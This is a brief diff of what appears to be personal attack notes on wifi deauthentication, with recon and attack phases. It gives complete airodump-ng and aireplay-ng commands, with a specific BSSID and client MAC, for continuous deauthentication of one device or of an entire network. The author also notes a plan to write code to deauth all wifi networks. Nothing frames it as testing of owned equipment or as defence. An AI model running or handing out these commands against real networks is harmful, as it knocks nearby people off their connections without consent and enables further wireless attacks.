@@ -14,15 +14,18 @@ RECON PHASE:
 	**(need to write code to deauth ALL wifi and also if we are looking for a specific Wifi name (ESSID))
 
 ATTACK PHASE:
-Deauth Specific Device on Network:
+-Deauth Specific Device on Network:
 				      BSSID
 4) sudo airodump-ng wlan0 --bssid 6C:F3:7F:21:BD:62 --channel 6 
 				     device	 	 wifi BSSID
 5) sudo aireplay-ng --deauth 0 -c 58:6B:14:89:79:44 -a 6C:F3:7F:21:BD:62 wlan0
 
 
-Deauth Entire Network:
-4) sudo aireplay-ng --deauth 0 -a 6C:F3:7F:21:BD:62 wlan0
+-Deauth Entire Network:
+
+4) sudo airodump-ng -c 6 wlan0
+
+5) sudo aireplay-ng --deauth 0 -a 6C:F3:7F:21:BD:62 wlan0
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
